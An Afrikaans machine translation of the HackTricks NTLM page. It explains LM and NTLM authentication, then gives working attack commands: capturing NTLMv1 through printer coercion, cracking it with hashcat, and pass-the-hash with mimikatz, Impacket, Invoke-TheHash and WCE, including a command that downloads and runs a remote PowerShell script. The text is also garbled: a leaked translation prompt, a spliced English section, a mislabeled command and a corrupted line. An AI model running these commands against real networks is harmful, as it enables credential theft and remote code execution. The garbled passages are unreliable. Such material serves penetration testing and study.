# NTLM

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersekerheidsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**hacktricks-opslag**](https://github.com/carlospolop/hacktricks) **en** [**hacktricks-cloud-opslag**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Basiese Inligting

In omgewings waar **Windows XP en Server 2003** in werking is, word LM (Lan-bestuurder) hasies gebruik, alhoewel dit algemeen erken word dat hierdie maklik gekompromitteer kan word. 'n Spesifieke LM-hash, `AAD3B435B51404EEAAD3B435B51404EE`, dui op 'n scenario waar LM nie gebruik word nie, en verteenwoordig die hash vir 'n leë string.

Standaard is die **Kerberos**-verifikasieprotokol die primêre metode wat gebruik word. NTLM (NT LAN-bestuurder) tree op onder spesifieke omstandighede: afwesigheid van Aktiewe Gids, nie-bestaan van die domein, wanfunksionering van Kerberos as gevolg van onvanpaste konfigurasie, of wanneer verbindinge probeer word met 'n IP-adres eerder as 'n geldige gasnaam.

Die teenwoordigheid van die **"NTLMSSP"**-kop in netwerkpakkette dui op 'n NTLM-verifikasieproses.

Ondersteuning vir die verifikasieprotokolle - LM, NTLMv1 en NTLMv2 - word fasiliteer deur 'n spesifieke DLL wat geleë is by `%windir%\Windows\System32\msv1\_0.dll`.

**Kernpunte**:

* LM-hasies is kwesbaar en 'n leë LM-hash (`AAD3B435B51404EEAAD3B435B51404EE`) dui op die nie-gebruik daarvan.
* Kerberos is die verstek-verifikasiemetode, met NTLM wat slegs onder sekere omstandighede gebruik word.
* NTLM-verifikasiepakkette is identifiseerbaar deur die "NTLMSSP" kop.
* LM, NTLMv1 en NTLMv2-protokolle word ondersteun deur die stelsel lêer `msv1\_0.dll`.

## LM, NTLMv1 en NTLMv2

Jy kan nagaan en konfigureer watter protokol gebruik sal word:

### GUI

Voer _secpol.msc_ uit -> Plaaslike beleid -> Sekuriteitsopsies -> Netwerksekuriteit: LAN-bestuurder-verifikasievlak. Daar is 6 vlakke (van 0 tot 5).

![](<../../.gitbook/assets/image (916).png>)

### Register

Dit sal die vlak 5 instel:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Moontlike waardes:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Basiese NTLM-domeinoutentiseringskema

1. Die **gebruiker** voer sy **geloofsbriewe** in
2. Die kliëntrekenaar **stuur 'n outentiseringsversoek** deur die **domeinnaam** en die **gebruikersnaam** te stuur
3. Die **bediener** stuur die **uitdaging**
4. Die **kliënt versleutel** die **uitdaging** deur die has van die wagwoord as sleutel te gebruik en stuur dit as 'n antwoord
5. Die **bediener stuur** die **domeinbeheerder** die **domeinnaam, die gebruikersnaam, die uitdaging en die antwoord**. As daar **nie 'n Geaktiveerde Gids geconfigureer is nie** of die domeinnaam die naam van die bediener is, word die geloofsbriewe **plaaslik nagegaan**.
6. Die **domeinbeheerder kyk of alles korrek is** en stuur die inligting na die bediener

Die **bediener** en die **Domeinbeheerder** is in staat om 'n **Veilige Kanaal** via die **Netlogon**-bediener te skep aangesien die Domeinbeheerder die wagwoord van die bediener ken (dit is binne die **NTDS.DIT**-databasis).

### Plaaslike NTLM-outentiseringskema

Die outentisering is soos die een wat **voorheen genoem is, maar** die **bediener** ken die **has van die gebruiker** wat probeer outentiseer binne die **SAM**-lêer. Dus, in plaas daarvan om die Domeinbeheerder te vra, sal die **bediener self nagaan** of die gebruiker kan outentiseer.

### NTLMv1-uitdaging

Die **uitdagingslengte is 8 byte** en die **antwoord is 24 byte** lank.

Die **has NT (16 byte)** is verdeel in **3 dele van elk 7 byte** (7B + 7B + (2B+0x00\*5)): die **laaste deel is met nulle gevul**. Dan word die **uitdaging** **afsonderlik versleutel** met elke deel en die **resultaatversleutelde byte** word **saamgevoeg**. Totaal: 8B + 8B + 8B = 24 byte.

**Probleme**:

* Gebrek aan **willekeurigheid**
* Die 3 dele kan **afsonderlik aangeval word** om die NT-has te vind
* **DES is kraakbaar**
* Die 3de sleutel bestaan altyd uit **5 nulls**.
* Met dieselfde uitdaging sal die antwoord dieselfde wees. Jy kan dus die slagoffer die string "**1122334455667788**" as 'n **uitdaging** gee en die antwoord aanval wat met **voorgekompilserde reënboogtabelle** gebruik is.

### NTLMv1-aanval

Dit word al hoe minder algemeen om omgewings met Onbeperkte Delegering geconfigureer te vind, maar dit beteken nie jy kan nie 'n Druksplolerdiens misbruik nie wat geconfigureer is.

Jy kan sekere geloofsbriewe/sessies wat jy reeds op die AD het, misbruik om die drukker te vra om teen 'n **gasheer onder jou beheer** te outentiseer. Dan kan jy met `metasploit auxiliary/server/capture/smb` of `responder` die outentiseringsuitdaging instel op 1122334455667788, die outentiseringspoging vasvang, en as dit gedoen is met **NTLMv1** sal jy dit kan **kraak**.\
As jy `responder` gebruik, kan jy probeer om die vlag `--lm` te gebruik om die **outentisering af te gradeer**.\
_Merk op dat vir hierdie tegniek die outentisering met NTLMv1 uitgevoer moet word (NTLMv2 is nie geldig nie)._

Onthou dat die drukker die rekenaarrekening tydens die outentisering sal gebruik, en rekenaarrekeninge gebruik **lang en willekeurige wagwoorde** wat jy waarskynlik nie sal kan kraak met algemene **woordeboeke** nie. Maar die **NTLMv1**-outentisering **gebruik DES** ([meer inligting hier](./#ntlmv1-challenge)), dus deur van dienste wat spesiaal toegewy is aan die kraak van DES gebruik te maak, sal jy dit kan kraak (jy kan byvoorbeeld [https://crack.sh/](https://crack.sh) gebruik).

### NTLMv1-aanval met hashcat

NTLMv1 kan ook gebreek word met die NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) wat NTLMv1-boodskappe in 'n metode formateer wat met hashcat gebreek kan word.

Die bevel
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
### Afrikaans Translation:

Die volgende is inhoud uit 'n hakboek oor hak tegnieke. Die volgende inhoud is uit die lêer windows-hardening/ntlm/README.md. Vertaal die relevante Engelse teks na Afrikaans en gee die vertaling terug met presies dieselfde markdown- en html-sintaks. Moet nie dinge soos kode, hak tegniek name, hak woord, wolk/SaaS platform name (soos Workspace, aws, gcp...), die woord 'leak', pentesting, en markdown-etikette vertaal nie. Moet ook nie enige ekstra goed byvoeg buite die vertaling en markdown-sintaks nie.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Skep 'n lêer met die inhoud van:
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Voer hashcat uit (verspreiding is die beste deur 'n instrument soos hashtopolis) aangesien dit andersins verskeie dae sal neem.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
In hierdie geval weet ons dat die wagwoord hiervoor password is, so ons gaan valsspeel vir demonstrasiedoeleindes:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Ons moet nou die hashcat-hulpprogramme gebruik om die gekraakte des-sleutels in dele van die NTLM-hash om te skakel:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
### Laaste deel:

Hierdie gedeelte sal fokus op die NTLM-protokol en hoe dit gebruik kan word vir aanvalle en hoe om dit te verhard.
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
### Windows Hardening: NTLM

#### NTLM Relay Attack

##### Description

The NTLM relay attack is a common technique used by attackers to exploit the NTLM authentication protocol. In this attack, the attacker intercepts the NTLM authentication request sent by a victim host and relays it to another host, tricking the second host into believing that the attacker is the victim. This allows the attacker to gain unauthorized access to resources on the second host using the victim's credentials.

##### Mitigation

To mitigate NTLM relay attacks, it is recommended to implement SMB signing, LDAP signing, and Extended Protection for Authentication. Additionally, enforcing the use of Kerberos authentication over NTLM can also help prevent these types of attacks. Regularly monitoring network traffic for suspicious activity can also help detect and prevent NTLM relay attacks.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Uitdaging

Die **uitdagingslengte is 8 byte** en **2 reaksies word gestuur**: Een is **24 byte** lank en die lengte van die **ander** is **veranderlik**.

**Die eerste reaksie** word geskep deur die **string** wat saamgestel is deur die **kliënt en die domein** te versleutel met **HMAC\_MD5** en die **hash MD4** van die **NT-hash** as **sleutel** te gebruik. Dan sal die **resultaat** as **sleutel** gebruik word om die **uitdaging** te versleutel met **HMAC\_MD5**. Hierby sal **'n kliënt-uitdaging van 8 byte bygevoeg word**. Totaal: 24 B.

Die **tweede reaksie** word geskep deur **verskeie waardes** te gebruik ('n nuwe kliënt-uitdaging, 'n **tydstempel** om **herhaalaanvalle** te voorkom...)

As jy 'n **pcap het wat 'n suksesvolle verifikasieproses vasgevang het**, kan jy hierdie gids volg om die domein, gebruikersnaam, uitdaging en reaksie te kry en probeer om die wagwoord te kraak: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pas-die-Hash Toe

**Sodra jy die hash van die slagoffer het**, kan jy dit gebruik om hom te **impersoneer**.\
Jy moet 'n **werktuig** gebruik wat die **NTLM-verifikasie uitvoer met** daardie **hash**, **of** jy kan 'n nuwe **sessieaanmelding** skep en daardie **hash** in die **LSASS** inspuit, sodat wanneer enige **NTLM-verifikasie uitgevoer word**, daardie **hash gebruik sal word.** Die laaste opsie is wat mimikatz doen.

**Onthou asseblief dat jy Pas-die-Hash-aanvalle ook met Rekenaarrekeninge kan uitvoer.**

### **Mimikatz**

**Moet as administrateur uitgevoer word**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Hierdie sal 'n proses lanceer wat aan die gebruikers behoort wat mimikatz begin het, maar intern in LSASS is die gestoorde geloofsbriewe diegene binne die mimikatz parameters. Dan kan jy toegang kry tot netwerkbronne asof jy daardie gebruiker is (soortgelyk aan die `runas /netonly` truuk maar jy hoef nie die plat-teks wagwoord te weet nie).

### Pass-the-Hash vanaf Linux

Jy kan kode-uitvoering op Windows-masjiene verkry deur Pass-the-Hash vanaf Linux te gebruik.\
[**Klik hier om te leer hoe om dit te doen.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows saamgestelde gereedskap

Jy kan [Impacket bineêre lêers vir Windows hier aflaai](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (In hierdie geval moet jy 'n bevel spesifiseer, cmd.exe en powershell.exe is nie geldig om 'n interaktiewe skaal te verkry nie)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Daar is verskeie Impacket bineêre lêers...

### Invoke-TheHash

Jy kan die powershell-skripte hier kry: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Roep-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Roep-SMB-kliënt aan
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Roep-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Roep-DieHash

Hierdie funksie is 'n **mengsel van al die ander**. Jy kan **verskeie gasheer** deurgee, **uitsonder** sommiges en die **opsie** kies wat jy wil gebruik (_SMBExec, WMIExec, SMBClient, SMBEnum_). As jy enige van **SMBExec** en **WMIExec** kies, maar **geen** _**Opdrag**_ parameter gee nie, sal dit net **kontroleer** of jy genoeg **regte** het.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Moet as administrateur uitgevoer word**

Hierdie instrument sal dieselfde ding doen as mimikatz (LSASS-geheue wysig).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Handleiding vir Windows afstands-uitvoering met gebruikersnaam en wagwoord

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## Ontgin van geloofsbriewe vanaf 'n Windows-gashuis

**Vir meer inligting oor** [**hoe om geloofsbriewe vanaf 'n Windows-gashuis te verkry, moet jy hierdie bladsy lees**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## NTLM Oordrag en Responder

**Lees 'n meer gedetailleerde gids oor hoe om hierdie aanvalle uit te voer hier:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## Ontleding van NTLM-uitdagings vanaf 'n netwerkvangs

**Jy kan gebruik maak van** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy by 'n **cybersekuriteitsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks-klere**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**hacktricks-opslag**](https://github.com/carlospolop/hacktricks) **en** [**hacktricks-cloud-opslag**](https://github.com/carlospolop/hacktricks-cloud).

</details>
